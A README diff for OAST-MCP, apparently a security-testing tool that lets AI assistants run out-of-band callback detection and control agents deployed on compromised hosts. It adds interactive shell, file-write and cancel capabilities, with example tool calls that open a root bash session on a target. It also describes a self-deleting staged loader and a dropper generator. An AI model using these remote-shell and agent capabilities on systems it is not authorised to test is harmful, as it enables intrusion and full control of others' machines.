@@ -10,7 +10,7 @@
 
 **Out-of-Band Application Security Testing via the Model Context Protocol.**
 
-OAST-MCP exposes six OAST tools and six agent-management tools to any MCP-compatible AI assistant. It lets an AI drive DNS/HTTP/HTTPS callback detection, deploy agents on compromised targets, and run remote tasks.
+OAST-MCP exposes six OAST tools and eight agent-management tools to any MCP-compatible AI assistant. It lets an AI drive DNS/HTTP/HTTPS callback detection, deploy agents on compromised targets, and run remote tasks — including fully interactive shell sessions via PTY.
 
 All from a single, audited MCP interface.
 
@@ -308,7 +308,7 @@ Stage 1 — loader (Linux C/musl ~77KB, Windows Go ~1.8MB)
 
 Stage 2 — agent (~3MB UPX)
   Connects WSS to the agent server, registers, accepts tasks.
-  Capabilities: exec, read_file, fetch_url, system_info.
+  Capabilities: exec, interactive_exec, read_file, write_file, fetch_url, system_info.
   Reconnects with exponential backoff.
   Self-deletes if the token expires.
 ```
@@ -360,7 +360,7 @@ Scope required: agent:admin
 Response: [{
   "agent_id":     "web-01",
   "status":       "online",
-  "capabilities": ["exec", "read_file", "fetch_url", "system_info"],
+  "capabilities": ["exec", "interactive_exec", "read_file", "write_file", "fetch_url", "system_info"],
   "insecure":     false,        // true = agent is running with TLS verification disabled
   "registered_at": "...",
   "last_seen_at": "...",
@@ -385,12 +385,14 @@ Response: { "task_id": "task-uuid", "status": "pending" }
 
 Available capabilities:
 
-| Capability    | Params                                       | Result                               | Notes                                          |
-| ------------- | -------------------------------------------- | ------------------------------------ | ---------------------------------------------- |
-| `exec`        | `cmd` (string), `timeout` (int, default 30s) | `output` (string), `exit_code` (int) |                                                |
-| `read_file`   | `path` (string)                              | `content` (base64), `path`           |                                                |
-| `fetch_url`   | `url` (string), `timeout` (int, default 15s) | `status` (int), `body` (base64)      | TLS verification follows the agent's `-k` flag |
-| `system_info` | —                                            | `hostname`, `os`, `arch`, `user`     |                                                |
+| Capability         | Params                                                              | Result                               | Notes                                                  |
+| ------------------ | ------------------------------------------------------------------- | ------------------------------------ | ------------------------------------------------------ |
+| `exec`             | `cmd` (string), `timeout` (int, default 30s)                        | `output` (string), `exit_code` (int) |                                                        |
+| `interactive_exec` | `command` (string), `binary` (bool, default false)                  | Use `agent_task_interact` for I/O    | PTY on Unix, pipes on Windows                          |
+| `read_file`        | `path` (string)                                                     | `content` (base64), `path`           |                                                        |
+| `write_file`       | `path` (string), `content_b64` (base64), `mode` (string, e.g. "0755") | `bytes_written` (int)             |                                                        |
+| `fetch_url`        | `url` (string), `timeout` (int, default 15s)                        | `status` (int), `body` (base64)      | TLS verification follows the agent's `-k` flag         |
+| `system_info`      | —                                                                   | `hostname`, `os`, `arch`, `user`     |                                                        |
 
 ### Check task status
 
@@ -406,6 +408,56 @@ Response: { "status": "done", "result": { "output": "uid=0(root)", "exit_code": 
 ```
 
 By default the call blocks server-side until the task completes or the wait timeout elapses — no polling needed. If `timed_out: true` is returned, the task is still running; call `agent_task_status` again. Set `wait: false` to get the current status instantly (useful when checking multiple tasks in parallel).
+
+### Interactive exec
+
+Start a process under a PTY (Unix) or pipes (Windows) and exchange stdin/stdout interactively. Use this for shell sessions, setuid binaries, or any program that prompts for input.
+
+```json
+// 1. Schedule the interactive process
+Tool: agent_task_schedule
+Args: { "agent_id": "web-01", "capability": "interactive_exec", "params": { "command": "bash" } }
+→ { "task_id": "task-uuid", "status": "pending" }
+
+// 2. Read initial output (shell prompt)
+Tool: agent_task_interact
+Args: { "task_id": "task-uuid" }
+→ { "stdout": "root@host:/# ", "stderr": "", "running": true }
+
+// 3. Send a command and read the response
+Tool: agent_task_interact
+Args: { "task_id": "task-uuid", "stdin": "id\\n" }
+→ { "stdout": "id\r\nuid=0(root) gid=0(root)\r\nroot@host:/# ", "stderr": "", "running": true }
+
+// 4. Exit the shell
+Tool: agent_task_interact
+Args: { "task_id": "task-uuid", "stdin": "exit\\n" }
+→ { "stdout": "exit\r\n", "stderr": "", "running": false, "exit_code": 0 }
+```
+
+**Stdin escape sequences** — C-style escapes are interpreted before sending to the process:
+
+| Escape | Byte | Use |
+|--------|------|-----|
+| `\n` | 0x0A | Newline / Enter |
+| `\r` | 0x0D | Carriage return |
+| `\t` | 0x09 | Tab (shell completion) |
+| `\\` | 0x5C | Literal backslash |
+| `\xNN` | hex | Control characters: `\x03` = Ctrl-C, `\x04` = Ctrl-D (EOF), `\x1b` = Escape |
+
+By default stdout/stderr are returned as UTF-8 text. Set `binary: true` for base64 encoding in both directions (useful when the process emits raw binary data).
+
+If `wait: true` (default) and no output is available yet, the call blocks server-side until output arrives or `timeout_secs` elapses — no polling loop needed.
+
+### Cancel a task
+
+```json
+Tool: agent_task_cancel
+Args: { "task_id": "task-uuid", "agent_id": "web-01" }
+→ { "task_id": "task-uuid", "agent_id": "web-01", "status": "cancelled" }
+```
+
+Transitions the task to a terminal state and sends a kill signal to the agent. Works for both regular and interactive tasks.
 
 ---
 
@@ -455,8 +507,11 @@ make build
 # Cross-compile (Linux amd64 for deployment)
 make cross
 
-# Tests (with race detector)
+# Unit tests (with race detector)
 make test
+
+# Docker smoke tests — full end-to-end: OAST callbacks + agent lifecycle
+make smoke
 
 # Generate a local token for testing
 ./bin/oast-mcp token --sub dev --scope oast:read,oast:write,agent:admin --ttl 24h
@@ -467,12 +522,12 @@ make test
 
 ### Scopes
 
-| Scope           | Tools                                                                                    |
-| --------------- | ---------------------------------------------------------------------------------------- |
-| `oast:write`    | `oast_create_session`, `oast_close_session`                                              |
-| `oast:read`     | `oast_list_sessions`, `oast_list_events`, `oast_wait_for_event`, `oast_generate_payload` |
-| `agent:admin`   | `agent_list`, `agent_task_schedule`, `agent_task_status`, `agent_dropper_generate`       |
-| `agent:connect` | WebSocket agent registration + `/dl/second-stage/` downloads                             |
+| Scope           | Tools                                                                                                                          |
+| --------------- | ------------------------------------------------------------------------------------------------------------------------------ |
+| `oast:write`    | `oast_create_session`, `oast_close_session`                                                                                    |
+| `oast:read`     | `oast_list_sessions`, `oast_list_events`, `oast_wait_for_event`, `oast_generate_payload`                                       |
+| `agent:admin`   | `agent_list`, `agent_task_schedule`, `agent_task_status`, `agent_task_interact`, `agent_task_cancel`, `agent_dropper_generate` |
+| `agent:connect` | WebSocket agent registration + `/dl/second-stage/` downloads                                                                   |
 
 ### Build loader and agent binaries
 
@@ -491,6 +546,27 @@ make build-all       # build + build-loaders + build-agents
 ```
 
 Binaries must be copied to `agent.bin_dir` on the server (Ansible handles this on `make deploy`).
+
+### Smoke tests
+
+Docker-based end-to-end tests that exercise every MCP tool against real (non-mock) components running inside a single container. No external services or domain delegation required.
+
+```bash
+make smoke
+```
+
+This builds a Docker image containing the test binary and a Linux agent, then runs the full suite:
+
+| Test | What it covers |
+|------|----------------|
+| `TestSmoke_OAST_DNS` | Session lifecycle, payload generation, DNS callback detection via native responder |
+| `TestSmoke_OAST_HTTP` | HTTP callback detection with Host header routing |
+| `TestSmoke_Agent_Lifecycle` | Agent deployment, `system_info`, `exec`, `read_file`, `write_file`, `fetch_url` |
+| `TestSmoke_Agent_InteractiveExec` | PTY session: send commands, read output, exit cleanly |
+| `TestSmoke_Agent_Cancel` | Task cancellation of a running interactive process |
+| `TestSmoke_Agent_StdinEscapes` | C-style escape interpretation (`\n`, `\x04` Ctrl-D) in `agent_task_interact` |
+
+The tests live in `test/smoke/` with build tag `//go:build smoke` so they are excluded from `go test ./...`.
 
 ### Token generation
 
